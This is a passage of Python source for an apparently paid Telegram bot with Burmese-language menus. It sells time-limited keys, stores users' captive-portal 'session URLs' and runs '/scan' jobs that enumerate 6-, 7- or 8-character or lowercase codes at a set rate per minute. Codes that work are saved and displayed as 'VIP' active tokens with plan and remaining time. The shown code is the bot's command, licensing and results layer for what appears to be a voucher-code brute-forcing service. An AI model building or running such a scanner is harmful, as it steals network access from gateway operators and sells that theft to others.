    await bot.reply_to(message, f"✅ User {target_id} အတွက် {command} လုပ်ဆောင်ချက်ပြီးပါပြီ။")


@bot.message_handler(commands=['profile'])
async def profile_command(message):
    key_info = await get_active_key_info(message.chat.id)
    status_text = "အသုံးပြုနိုင်သည်" if key_info else "အသုံးပြုခွင့် မရှိသေးပါ"
    await bot.reply_to(message, f"{user_profile_text(message)}\n\n🔐 Key အခြေအနေ: {status_text}")


@bot.message_handler(commands=['cancel'])
async def cancel_command(message):
    await stop_scan(message)


@bot.message_handler(commands=['clear'])
async def clear_command(message):
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("✅ ဖျက်မည်", callback_data="util:clear_yes"),
        telebot.types.InlineKeyboardButton("❌ မဖျက်တော့ပါ", callback_data="util:clear_no"),
    )
    await bot.reply_to(message, "⚠️ သင့် session နှင့် ကိုယ်ပိုင် setting များကို ဖျက်မလား?", reply_markup=markup)


@bot.message_handler(commands=['settings'])
async def settings_command(message):
    chat_id = message.chat.id
    data = user_data.get(chat_id, {})
    key_info = await get_active_key_info(chat_id)
    scan = scan_tasks.get(chat_id)
    scan_state = "လုပ်ဆောင်နေသည်" if scan and not scan["task"].done() else "မလုပ်ဆောင်ပါ"
    speed = f"{SPEED_LIMIT:,.0f} codes/min" if SPEED_LIMIT else "အကန့်အသတ်မရှိ"
    await bot.reply_to(
        message,
        "⚙️ <b>လက်ရှိ Setting များ</b>\n\n"
        f"🔐 Key: {'အသုံးပြုနိုင်သည်' if key_info else 'မရှိသေးပါ'}\n"
        f"🔍 Scanner: {scan_state}\n"
        f"⚡ အမြန်နှုန်း: {speed}\n"
        f"🌐 Session: {'သိမ်းထားသည်' if data.get('session_url') else 'မသိမ်းရသေးပါ'}",
        parse_mode="HTML",
    )


@bot.message_handler(commands=['language'])
async def language_command(message):
    args = message.text.split(maxsplit=1)
    if len(args) == 1:
        await bot.reply_to(message, "🌐 လက်ရှိဘာသာစကား: မြန်မာ\nပြောင်းရန်: /language my သို့မဟုတ် /language en")
        return
    choice = args[1].strip().lower()
    if choice not in {"my", "mm", "en"}:
        await bot.reply_to(message, "❌ `my` သို့မဟုတ် `en` ကိုသာ အသုံးပြုပါ။", parse_mode="Markdown")
        return
    language_prefs[message.chat.id] = "en" if choice == "en" else "my"
    USER_REGISTRY.setdefault(str(message.chat.id), {}).update({"language": language_prefs[message.chat.id]})
    await save_user_registry()
    await bot.reply_to(message, "✅ ဘာသာစကား setting ကို သိမ်းပြီးပါပြီ။ လက်ရှိ menu သည် မြန်မာစာဖြင့် ပြသထားပါတယ်။")


@bot.message_handler(commands=['logs'])
async def logs_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    try:
        with open("bot.log", "r", encoding="utf-8", errors="replace") as log_file:
            lines = log_file.readlines()[-20:]
        content = "".join(lines).strip() or "Log မရှိသေးပါ။"
        if len(content) > 3500:
            content = content[-3500:]
        await bot.reply_to(message, f"🧾 <b>နောက်ဆုံး Log</b>\n\n<pre>{html.escape(content)}</pre>", parse_mode="HTML")
    except OSError as exc:
        await bot.reply_to(message, f"❌ Log ဖတ်မရပါ: {html.escape(str(exc))}", parse_mode="HTML")


@bot.message_handler(commands=['stats'])
async def stats_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    active = sum(1 for data in scan_tasks.values() if not data["task"].done())
    await bot.reply_to(
        message,
        "📈 <b>အသေးစိတ်စာရင်း</b>\n\n"
        f"👥 User စုစုပေါင်း: {len(user_data)}\n"
        f"✅ Key အသုံးပြုခွင့်ရှိသူ: {sum(1 for value in approve.values() if value)}\n"
        f"🔍 Active scanner: {active}\n"
        f"✅ Saved success messages: {len(success_messages)}\n"
        f"⚠️ Limited messages: {len(limited_messages)}",
        parse_mode="HTML",
    )


def format_expiry_date(expiry_value):
    try:
        expiry_dt = datetime.fromisoformat(str(expiry_value).replace("Z", "+00:00"))
        return expiry_dt.astimezone(timezone.utc).strftime("%d %B %Y, %I:%M %p UTC")
    except (TypeError, ValueError):
        return "မသိရသေးပါ"


@bot.callback_query_handler(func=lambda call: call.data.startswith("notify:"))
async def expiry_notify_callback(call):
    await bot.answer_callback_query(call.id)
    chat_id = call.message.chat.id
    if not is_admin(chat_id):
        await bot.send_message(chat_id, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    action = call.data.split(":", 1)[1]
    if action == "cancel":
        pending_expiry_notifications.pop(chat_id, None)
        await bot.send_message(chat_id, "ℹ️ Key သက်တမ်းသတိပေးချက် ပို့ခြင်းကို ပယ်ဖျက်လိုက်ပါပြီ။")
        return
    if action != "confirm":
        return
    recipients = pending_expiry_notifications.pop(chat_id, [])
    if not recipients:
        await bot.send_message(chat_id, "ℹ️ ပို့ရန် recipient မရှိတော့ပါ။")
        return
    delivered = 0
    for recipient in recipients:
        try:
            await bot.send_message(
                recipient["chat_id"],
                EXPIRY_NOTIFICATION_TEMPLATE.format(
                    name=html.escape(recipient.get("name", "VIP User")),
                    username_line=(
                        f"\n👤 Username: @{html.escape(recipient['username'])}"
                        if recipient.get("username") else ""
                    ),
                    expires_at=html.escape(recipient.get("expires_at", "မသိရသေးပါ")),
                    remaining=html.escape(recipient.get("remaining", "မသိရသေးပါ")),
                ),
                parse_mode="HTML",
            )
            delivered += 1
        except Exception as exc:
            print(f"Expiry notification failed for {recipient['chat_id']}: {exc}")
    await bot.send_message(chat_id, f"✅ Key သက်တမ်းသတိပေးချက် ပို့ပြီးပါပြီ။ လက်ခံသူ {delivered} ဦး။")


@bot.message_handler(commands=['notify_expiring'])
async def notify_expiring_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    args = message.text.split(maxsplit=1)
    try:
        days = int(args[1].strip()) if len(args) > 1 else 3
        if days < 1 or days > 30:
            raise ValueError
    except ValueError:
        await bot.reply_to(message, "❌ ရက်အရေအတွက်ကို 1 မှ 30 အတွင်း ထည့်ပါ။ ဥပမာ: /notify_expiring 3")
        return

    auth_list, _ = await get_file_content("auth_list.json")
    now = datetime.now(timezone.utc)
    cutoff = now + timedelta(days=days)
    recipients = []
    for chat_id, data in user_data.items():
        active_key = data.get("active_key") if isinstance(data, dict) else None
        key_data = auth_list.get(active_key) if active_key else None
        if not isinstance(key_data, dict) or key_data.get("expires_at") == ADMIN_UNLIMITED_EXPIRY:
            continue
        try:
            expiry = datetime.fromisoformat(str(key_data.get("expires_at")).replace("Z", "+00:00"))
        except (TypeError, ValueError):
            continue
        if now < expiry <= cutoff:
            profile = user_data.get(chat_id, {})
            recipients.append({
                "chat_id": chat_id,
                "name": profile.get("display_name") or "VIP User",
                "username": profile.get("username") or "",
                "remaining": format_key_remaining(key_data),
                "expires_at": format_expiry_date(key_data.get("expires_at")),
            })

    if not recipients:
        await bot.reply_to(message, f"ℹ️ လာမည့် {days} ရက်အတွင်း ကုန်မည့် active key မရှိပါ။")
        return
    pending_expiry_notifications[message.chat.id] = recipients
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("✅ ပို့မည်", callback_data="notify:confirm"),
        telebot.types.InlineKeyboardButton("❌ မပို့တော့ပါ", callback_data="notify:cancel"),
    )
    await bot.reply_to(
        message,
        f"📢 {days} ရက်အတွင်း key ကုန်မည့် user <b>{len(recipients)} ဦး</b> တွေ့ပါတယ်။\n\n"
        "အောက်ပါသတိပေးချက်ကို သူတို့ထံ ပို့မလား?",
        parse_mode="HTML",
        reply_markup=markup,
    )


@bot.message_handler(commands=['broadcast'])
async def broadcast_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "အသုံးပြုပုံ: /broadcast သင့်ကြေညာချက်")
        return
    pending_broadcast[message.chat.id] = args[1].strip()
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("✅ ပို့မည်", callback_data="util:broadcast_yes"),
        telebot.types.InlineKeyboardButton("❌ မပို့တော့ပါ", callback_data="util:broadcast_no"),
    )
    await bot.reply_to(message, f"📢 အောက်ပါစာကို ပို့မလား?\n\n{html.escape(args[1])}", parse_mode="HTML", reply_markup=markup)


@bot.message_handler(commands=['backup'])
async def backup_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    safe_users = {
        str(chat_id): {
            "has_session": bool(data.get("session_url")),
            "active_key": bool(data.get("active_key")),
        }
        for chat_id, data in user_data.items()
    }
    payload = json.dumps({"created_at": get_current_time(), "users": safe_users}, ensure_ascii=False, indent=2).encode("utf-8")
    document = io.BytesIO(payload)
    document.name = "vip99-safe-backup.json"
    await bot.send_document(message.chat.id, document, caption="✅ Token နှင့် session URL မပါသော safe backup ဖိုင်")


@bot.message_handler(commands=['reload'])
async def reload_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    auth_list, _ = await get_file_content("auth_list.json")
    results, _ = await get_file_content("result.json")
    await bot.reply_to(message, f"✅ GitHub data ပြန်ဖတ်ပြီးပါပြီ။ Keys: {len(auth_list)} ခု၊ Result users: {len(results)} ဦး။")


@bot.message_handler(commands=['cancelall'])
async def cancel_all_command(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "⛔ စီမံခန့်ခွဲသူခွင့်ပြုချက် လိုအပ်ပါတယ်။")
        return
    cancelled = 0
    for chat_id, data in list(scan_tasks.items()):
        task = data.get("task")
        if task and not task.done():
            data["stop"] = True
            task.cancel()
            cancelled += 1
        scan_tasks.pop(chat_id, None)
    await bot.reply_to(message, f"✅ Active scanner အားလုံးကို ရပ်ပြီးပါပြီ။ စုစုပေါင်း {cancelled} ခု။")


@bot.message_handler(commands=['help'])
async def help_command(message):
    await bot.reply_to(
        message,
        "📋 **အသုံးပြုနိုင်သော Command များ:**\n\n"
        "🔑 `/key YOUR_KEY` - သော့ဖွင့်ရန်\n"
        "📄 `/result` - သိမ်းထားသောရလဒ်များကြည့်ရန်\n"
        "🌐 `/input SESSION_URL` - Session လင့်ခ်သိမ်းရန်\n"
        "🔍 `/scan MODE` - Scan စတင်ရန်\n"
        "🔄 `/recheck` - သိမ်းထားသော code များပြန်စစ်ရန်\n"
        "🛑 `/stop` - ကိုယ့် scan ကိုရပ်ရန်\n"
        "❔ `/help` - အကူအညီကြည့်ရန်\n"
        "🏠 `/menu` - ပင်မမီနူးဖွင့်ရန်\n"
        "🏓 `/ping` - Bot တုံ့ပြန်မှုစစ်ရန်\n"
        "⏱ `/uptime` - Bot လည်ပတ်ချိန်ကြည့်ရန်\n"
        "👤 `/profile` - ကိုယ်ရေးအချက်အလက်နှင့် key အခြေအနေကြည့်ရန်\n"
        "❌ `/cancel` - ကိုယ့်လုပ်ဆောင်ချက်ကို ပယ်ဖျက်ရန်\n"
        "🧹 `/clear` - ကိုယ်ပိုင် session/setting ရှင်းရန်\n"
        "⚙️ `/settings` - လက်ရှိ setting များကြည့်ရန်\n"
        "🌐 `/language` - ဘာသာစကား setting ပြောင်းရန်\n\n"
        "👑 **စီမံခန့်ခွဲသူ Command များ:**\n\n"
        "🔑 `/genkey` - သော့သက်တမ်းအစီအစဉ်ရွေးရန်\n"
        "🗓️ `/genkey PLAN_OR_DATE` - အသုံးပြုနိုင်သော သော့ဖန်တီးရန်\n"
        "📋 `/listkeys` - မှတ်ပုံတင်ထားသော သော့များစာရင်းကြည့်ရန်\n"
        "🗑️ `/delkey KEY` - သော့ဖျက်ရန်\n"
        "📊 `/status` - Bot အခြေအနေကြည့်ရန်\n"
        "⚡ `/speed 7890` - Scan အမြန်နှုန်းကန့်သတ်ရန်\n"
        "🧾 `/logs` - နောက်ဆုံး log များကြည့်ရန်\n"
        "📈 `/stats` - အသေးစိတ်စာရင်းအင်းကြည့်ရန်\n"
        "📢 `/broadcast စာ` - ကြေညာချက်ပို့ရန်\n"
        "💾 `/backup` - safe backup ဖိုင်ရယူရန်\n"
        "🔃 `/reload` - GitHub data ပြန်ဖတ်ရန်\n"
        "🛑 `/cancelall` - scanner အားလုံးရပ်ရန်\n"
        "👥 `/users` - User စာရင်းနှင့် စီမံခန့်ခွဲမှု\n"
        "🔎 `/user USER_ID` - User အသေးစိတ်\n"
        "🚫 `/ban USER_ID` / `/unban USER_ID` - User ပိတ်/ဖွင့်\n"
        "🧹 `/resetuser USER_ID` - User session နှင့် access reset\n"
        "🔔 `/notify_expiring 3` - key ကုန်ခါနီးသူများကို အသိပေးရန်\n"
        "♻️ `/restart` - Bot ပြန်စရန်",
        parse_mode="Markdown"
    )
    if is_admin(message.chat.id):
        admin_markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        admin_markup.add(
            telebot.types.InlineKeyboardButton("👑 သော့ဖန်တီးရန်", callback_data="menu:genkey"),
            telebot.types.InlineKeyboardButton("⚡ အမြန်နှုန်း", callback_data="menu:speed"),
            telebot.types.InlineKeyboardButton("📊 အခြေအနေ", callback_data="menu:status"),
            telebot.types.InlineKeyboardButton("🧾 Log များ", callback_data="menu:logs"),
            telebot.types.InlineKeyboardButton("📈 စာရင်းအင်း", callback_data="menu:stats"),
            telebot.types.InlineKeyboardButton("📢 ကြေညာချက်", callback_data="menu:broadcast"),
            telebot.types.InlineKeyboardButton("💾 Backup", callback_data="menu:backup"),
            telebot.types.InlineKeyboardButton("🔃 Data ပြန်ဖတ်ရန်", callback_data="menu:reload"),
            telebot.types.InlineKeyboardButton("🛑 Scanner အားလုံးရပ်ရန်", callback_data="menu:cancelall"),
            telebot.types.InlineKeyboardButton("👥 User စီမံရန်", callback_data="menu:users"),
            telebot.types.InlineKeyboardButton("🔎 User ရှာရန်", callback_data="menu:usersearch"),
        )
        await bot.send_message(message.chat.id, "👑 စီမံခန့်ခွဲသူကိရိယာများ", reply_markup=admin_markup)



@bot.message_handler(commands=['key'])
async def handle_key(message):
    if is_blocked(message.chat.id) and not is_admin(message.chat.id):
        await bot.reply_to(message, "🚫 သင့် account ကို ပိတ်ထားပါတယ်။")
        return
    if is_admin(message.chat.id):
        approve[message.chat.id] = True
        user_data.setdefault(message.chat.id, {})
        await bot.reply_to(message, "✅ Admin အနေဖြင့် Key မလိုဘဲ အတည်ပြုပြီးပါပြီ။ /input ဖြင့် Session URL ထည့်ပါ။")
        return

    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(message, "❌ Please provide a key: `/key YOUR_KEY`", parse_mode="Markdown")
        return
    supplied_key = args[1].strip()
    auth_list, _ = await get_file_content("auth_list.json")
    matched_key = next((k for k in auth_list if str(k).strip() == supplied_key), None)
    if matched_key is not None and check_key_expiration(auth_list[matched_key]):
        approve[message.chat.id] = True
        user_data.setdefault(message.chat.id, {})
        user_data[message.chat.id]["active_key"] = matched_key
        USER_REGISTRY.setdefault(str(message.chat.id), {}).update({
            "active_key": matched_key,
            "key_activated_at": datetime.now(timezone.utc).isoformat(),
        })
        await save_user_registry()
        await bot.reply_to(
            message,
            "✅ **Key Activated!**\n\n📊 Status: Active\n\nUse /input to save your session URL.",
            parse_mode="Markdown"
        )
    else:
        approve[message.chat.id] = False
        await bot.reply_to(
            message,
            "❌ **Your key is expired or not activated!**\n"
            "Please use `/key YOUR_KEY` to activate.",
            parse_mode="Markdown"
        )



@bot.message_handler(commands=['listkeys'])
async def listkeys(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        auth_list, _ = await get_file_content("auth_list.json")
        if not auth_list:
            await bot.reply_to(message, "Registered key မရှိသေးပါ။")
            return
        lines = []
        for uid, data in auth_list.items():
            if isinstance(data, dict):
                expires = data.get("expires_at", "unknown")
                plan = data.get("plan", "unknown")
                if expires == "9999-12-31T23:59:59Z":
                    expires_str = "Unlimited"
                else:
                    try:
                        exp_dt = datetime.fromisoformat(expires.replace("Z", "+00:00"))
                        now = datetime.now(timezone.utc)
                        if exp_dt < now:
                            expires_str = "Expired"
                        else:
                            diff = exp_dt - now
                            days = diff.days
                            hours, rem = divmod(diff.seconds, 3600)
                            minutes = rem // 60
                            expires_str = f"{days}d {hours}h {minutes}m left"
                    except:
                        expires_str = expires
            else:
                plan = "old"
                expires_str = str(data)
            lines.append(f"👤 {uid}\n   Plan: {plan}\n   Expires: {expires_str}")
        text = f"📋 Registered Keys ({len(auth_list)})\n\n" + "\n\n".join(lines)
        if len(text) > 4096:
            for i in range(0, len(text), 4096):
                await bot.send_message(message.chat.id, text[i:i+4096])
        else:
            await bot.reply_to(message, text)
    except Exception as e:
        print(f"Error at listkeys {e}")

@bot.message_handler(commands=['delkey'])
async def delkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return
    try:
        args = message.text.split()
        if len(args) < 2:
            await bot.reply_to(message, "Usage:\n/delkey 123456789")
            return
        user_id = args[1]
        auth_list, sha = await get_file_content("auth_list.json")
        if user_id not in auth_list:
            await bot.reply_to(message, f"Key {user_id} မတွေ့ပါ။")
            return
        if str(user_id).strip() == str(ADMIN_ID).strip():
            await bot.reply_to(message, "👑 Admin key ကို ဖျက်လို့မရပါ။ Admin access သည် Unlimited ဖြစ်ပါတယ်။")
            return
        del auth_list[user_id]
        await update_file_content(
            "auth_list.json",
            auth_list,
            sha,
            f"Delete key for {user_id}"
        )
        approve.pop(int(user_id), None)
        user_data.pop(int(user_id), None)
        await bot.reply_to(
            message,
            f" Key Deleted\n\nUSER ID : {user_id}"
        )
    except Exception as e:
        print(f"Error at delkey {e}")

async def create_access_key(plan):
    expiry = generate_expiry(plan)
    if not expiry:
        return None, None

    auth_list, sha = await get_file_content("auth_list.json")
    key = f"KEY-{uuid.uuid4().hex[:12].upper()}"
    while key in auth_list:
        key = f"KEY-{uuid.uuid4().hex[:12].upper()}"
    auth_list[key] = {"expires_at": expiry, "plan": plan}
    await update_file_content(
        "auth_list.json", auth_list, sha, f"Generate {plan} access key"
    )
    return key, expiry


@bot.message_handler(commands=['genkey'])
async def genkey(message):
    if not is_admin(message.chat.id):
        await bot.reply_to(message, "No Permission")
        return

    args = message.text.split()
    if len(args) < 2:
        markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        buttons = [
            telebot.types.InlineKeyboardButton("⏱️ ၃၀ မိနစ်", callback_data="genkey:30m"),
            telebot.types.InlineKeyboardButton("🕐 ၁ နာရီ", callback_data="genkey:1h"),
            telebot.types.InlineKeyboardButton("🕑 ၂ နာရီ", callback_data="genkey:2h"),
            telebot.types.InlineKeyboardButton("📅 ၁ ရက်", callback_data="genkey:1d"),
            telebot.types.InlineKeyboardButton("🗓️ ၃၀ ရက်", callback_data="genkey:30d"),
            telebot.types.InlineKeyboardButton("🏆 ၁ နှစ်", callback_data="genkey:1yr"),
        ]
        markup.add(*buttons)
        await bot.reply_to(message, "🔑 Key သက်တမ်းကို ရွေးချယ်ပါ။ ရွေးပြီးတာနဲ့ ကျပန်း key အသစ် ဖန်တီးပေးပါမယ်။", reply_markup=markup)
        return

    plan = args[1].lower()
    key, expiry = await create_access_key(plan)
    if not key:
        await bot.reply_to(message, "❌ Invalid plan. Use /genkey and select a button.")
        return
    await bot.reply_to(
        message,
        "🔑 Key Generated\n\n"
        f"KEY : `{key}`\n"
        f"PLAN : {plan}\n"
        f"EXPIRES : {expiry}\n\n"
        f"User အသုံးပြုရန်: `/key {key}`",
        parse_mode="Markdown"
    )


@bot.callback_query_handler(func=lambda call: call.data.startswith("genkey:"))
async def genkey_callback(call):
    if not is_admin(call.from_user.id):
        await bot.answer_callback_query(call.id, "No Permission", show_alert=True)
        return

    plan = call.data.split(":", 1)[1]
    key, expiry = await create_access_key(plan)
    await bot.answer_callback_query(call.id)
    if not key:
        await bot.send_message(call.message.chat.id, "❌ Could not create key.")
        return
    await bot.edit_message_text(
        "🔑 Key Generated\n\n"
        f"KEY : `{key}`\n"
        f"PLAN : {plan}\n"
        f"EXPIRES : {expiry}\n\n"
        f"User အသုံးပြုရန်: `/key {key}`",
        call.message.chat.id,
        call.message.message_id,
        parse_mode="Markdown"
    )

def pretty_duration(value):
    """Normalize compact durations into a cleaner VIP display."""
    value = str(value).strip()
    match = re.fullmatch(r"(\d+)h", value, flags=re.IGNORECASE)
    if match:
        number = int(match.group(1))
        return f"{number} HOUR" if number == 1 else f"{number} HOURS"
    match = re.fullmatch(r"(\d+)m", value, flags=re.IGNORECASE)
    if match:
        number = int(match.group(1))
        return f"{number} MINUTE" if number == 1 else f"{number} MINUTES"
    return value


def format_saved_hit(entry):
    """Render both new metadata records and legacy plain-code entries."""
    if isinstance(entry, dict):
        code = str(entry.get("code", "Unknown"))
        detail = str(entry.get("detail", ""))
    else:
        raw = str(entry)
        if " 🃏: " in raw:
            code, detail = raw.split(" 🃏: ", 1)
        else:
            code, detail = raw, ""

    plan_text = "Unknown"
    time_text = "Unknown"
    if detail:
        if " 🃏: " in detail:
            detail = detail.split(" 🃏: ", 1)[1]
        parts = detail.replace("📋 ", "").split(" | ")
        plan_text = parts[0].removeprefix("Plan: ") if parts else "Unknown"
        time_text = parts[1].removeprefix("⏳ Time: ") if len(parts) > 1 else "Unknown"

    safe_code = html.escape(code)
    safe_plan = html.escape(plan_text)
    safe_time = html.escape(pretty_duration(time_text))
    return (
        "👑 <b>STLINK VIP WALLET</b> 👑\n"
        "┌─────────────────┐\n"
        f"│ 🃏 <code>{safe_code}</code> 🪙\n"
        f"│ 💠 {safe_plan}\n"
        f"│ ⏳ {safe_time}\n"
        "│ 🟢 ACTIVE TOKEN\n"
        "└─────────────────┘"
    )


@bot.message_handler(commands=['result'])
async def handle_result(message):
    results, _ = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    entries = results.get(chat_id_str, [])
    if entries:
        cards = "\n\n".join(format_saved_hit(entry) for entry in entries)
        text = (
            "👑 <b>STLINK VIP VAULT</b> 👑\n"
            "━━━━━━━━━━━━━━━━━━\n"
            f"🏆 <b>TOTAL VIP TOKENS:</b> {len(entries)}\n"
            "🔐 Your premium access passes\n\n"
            f"{cards}"
        )
        result_markup = telebot.types.InlineKeyboardMarkup(row_width=2)
        result_markup.add(
            telebot.types.InlineKeyboardButton(menu_text(chat_id, "🔄 ပြန်စစ်ရန်", "🔄 Recheck"), callback_data="menu:recheck"),
            telebot.types.InlineKeyboardButton("🏠 ပင်မမီနူး", callback_data="menu:home"),
        )
        await bot.reply_to(message, text, parse_mode="HTML", reply_markup=result_markup)
    else:
        await bot.reply_to(
            message,
            "📭 <b>NO SAVED RESULTS</b>\n\nသင့်တွင် ယခင်ကရရှိထားသော code မရှိသေးပါ။",
            parse_mode="HTML"
        )

def check_key_expiration(expiration_time):
    try:
        if isinstance(expiration_time, dict):
            expiry = expiration_time.get("expires_at")
            if expiry == ADMIN_UNLIMITED_EXPIRY:
                return True
            exp_time = datetime.fromisoformat(
                expiry.replace("Z", "+00:00")
            )
            return datetime.now(timezone.utc) < exp_time
        mm, hh, dd, MM, yyyy = map(
            int,
            expiration_time.split('-')
        )
        expiration_dt = datetime(
            year=yyyy,
            month=MM,
            day=dd,
            hour=hh,
            minute=mm,
            second=0,
            tzinfo=timezone.utc
        )
        return datetime.now(timezone.utc) < expiration_dt
    except Exception as e:
        print("Key parse error:", e)
        return False

def parse_expiry_input(value):
    """Return (ISO-UTC expiry, label) for a duration plan or explicit UTC date/time."""
    value = value.strip()
    plan = value.lower()
    if plan in {"30m", "1h", "1hr", "2h", "2hr", "1d", "7d", "30d", "1m", "1mon", "1y", "1yr", "1yer", "unlimited"}:
        return generate_expiry(plan), plan

    try:
        normalized = value.replace("T", " ")
        if len(normalized) == 10:
            expiry_dt = datetime.strptime(normalized, "%Y-%m-%d").replace(
                hour=23, minute=59, second=59, tzinfo=timezone.utc
            )
        else:
            expiry_dt = datetime.strptime(normalized, "%Y-%m-%d %H:%M").replace(
                tzinfo=timezone.utc
            )
        if expiry_dt <= datetime.now(timezone.utc):
            return None, None
        return expiry_dt.isoformat().replace("+00:00", "Z"), "custom"
    except ValueError:
        return None, None


def generate_expiry(plan):
    now = datetime.now(timezone.utc)
    plans = {
        "30m": timedelta(minutes=30),
        "1h": timedelta(hours=1),
        "1hr": timedelta(hours=1),
        "2h": timedelta(hours=2),
        "2hr": timedelta(hours=2),
        "3h": timedelta(hours=3),
        "1d": timedelta(days=1),
        "7d": timedelta(days=7),
        "30d": timedelta(days=30),
        "1m": timedelta(days=30),
        "1mon": timedelta(days=30),
        "1y": timedelta(days=365),
        "1yr": timedelta(days=365),
        "1yer": timedelta(days=365),
        "unlimited": None
    }
    if plan not in plans:
        return None
    if plan == "unlimited":
        return "9999-12-31T23:59:59Z"
    return (now + plans[plan]).isoformat()

def get_current_time():
    return datetime.now(timezone.utc)

@bot.message_handler(commands=['recheck'])
async def recheck(message):
    chat_id = message.chat.id
    user_data.setdefault(chat_id, {})
    results, sha = await get_file_content("result.json")
    chat_id_str = str(message.chat.id)
    if chat_id_str in results and results[chat_id_str]:
            if "session_url" not in user_data[message.chat.id]:
                await bot.reply_to(message, "/recheck ကိုအသုံးမပြုမီ /input ဖြင့် Session URL ကိုအရင်ထည့်သွင်းပေးရပါမည်။")
                return
            codes = results[chat_id_str]
            await bot.reply_to(message, "🔄 Success Code များအား ပြန်လည်စစ်ဆေးနေပါသည်။")
            session_url_recheck = user_data[message.chat.id]["session_url"]
            recheck_list = []
            for entry in codes:
                code = entry.get("code") if isinstance(entry, dict) else entry
                recode = await perform_check(
                    session_url_recheck,
                    code,
                    chat_id,
                    scan_id=None,
                    recheck=True,
                    message=message
                )
                if recode:
                    recheck_list.append(recode)
            to_show = "\n".join(recheck_list) if recheck_list else "Code များအားလုံးစစ်ဆေးပြီးပါပြီ မည်သည့် success code မျှရှာမတွေ့ပါ။"
            await bot.reply_to(message, f"✅ Rechcked Codes:\n\n{to_show}")
            await save_rechecked_codes(chat_id_str, recheck_list, sha)
    else:
        await bot.reply_to(message, "သင့်တွင် success code တစ်ခုမျှမရှိသေးပါ။")

async def save_rechecked_codes(chat_id_str, recheck_list, sha):
    results, _ = await get_file_content("result.json")
    results[chat_id_str] = recheck_list
    await update_file_content("result.json", results, sha, f"Update after recheck for {chat_id_str}")

async def check_session_url(session_url):
    """Network pre-check မလုပ်ဘဲ Session URL ၏ ပုံစံကိုသာ စစ်ဆေးပါ။"""
    from urllib.parse import urlparse

    # Telegram မှ <URL> ပုံစံဖြင့် paste လုပ်ထားပါက wrapper ကို ဖယ်ပါ။
    session_url = session_url.strip().strip('<>')
    parsed = urlparse(session_url)

    # Gateway URL များသည် local IP, hostname သို့မဟုတ် portal domain ဖြစ်နိုင်ပါသည်။
    # gw_id / mac / sessionId စသည့် query parameter များကို မဖြစ်မနေ မတောင်းပါ။
    if parsed.scheme not in ('http', 'https'):
        return False
    if not parsed.netloc or ' ' in session_url:
        return False

    # Server ကို ဤနေရာတွင် မခေါ်ပါ။ မည်သည့် gateway response မဆို
    # /scan အတွင်း get_session_id() မှ စစ်ဆေးမည်ဖြစ်သည်။
    return True

@bot.message_handler(commands=['input'])
async def handle_input(message):
    if is_blocked(message.chat.id) and not is_admin(message.chat.id):
        await bot.reply_to(message, "🚫 သင့် account ကို ပိတ်ထားပါတယ်။")
        return
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "🌐 <b>SESSION URL REQUIRED</b>\n\n"
            "အသုံးပြုပုံ:\n"
            "<code>/input YOUR_SESSION_URL</code>",
            parse_mode="HTML"
        )
        return
    url = args[1].strip().strip('<>')
    if message.chat.id in user_data:
        await bot.reply_to(
            message,
            "🔍 <b>SESSION CHECK</b>\n"
            "━━━━━━━━━━━━━━━━━━\n"
            "⏳ Session URL အား စစ်ဆေးနေပါသည်...",
            parse_mode="HTML"
        )
        if await check_session_url(session_url=url):
            user_data[message.chat.id]['session_url'] = url
            await bot.reply_to(
                message,
                "✅ <b>SESSION SAVED SUCCESSFULLY</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "🔐 Session URL အား သိမ်းဆည်းပြီးပါပြီ။\n\n"
                "🎯 စတင်ရန် mode တစ်ခုရွေးပါ:\n"
                "<code>/scan 6</code>  •  <code>/scan 7</code>\n"
                "<code>/scan 8</code>  •  <code>/scan all</code>\n"
                "<code>/scan ascii-lower</code>\n\n"
                "🚀 Mode ရွေးပြီး scan စတင်နိုင်ပါပြီ။",
                parse_mode="HTML"
            )
        else:
            await bot.reply_to(
                message,
                "❌ <b>INVALID SESSION URL</b>\n"
                "━━━━━━━━━━━━━━━━━━\n"
                "ကျေးဇူးပြု၍ Session URL ကို ပြန်စစ်ပြီး ပို့ပါ။",
                parse_mode="HTML"
            )

@bot.message_handler(commands=['scan'])
async def scan(message):
    args = message.text.split(maxsplit=1)
    if len(args) < 2:
        await bot.reply_to(
            message,
            "Usage:\n\n/scan <6, 7, 8, ascii-lower, all>"
        )
        return
    mode = args[1]
    chat_id = message.chat.id
    if is_blocked(chat_id) and not is_admin(chat_id):
        await bot.reply_to(message, "🚫 သင့် account ကို ပိတ်ထားပါတယ်။")
        return
    if not is_admin(chat_id) and not approve.get(chat_id, False):
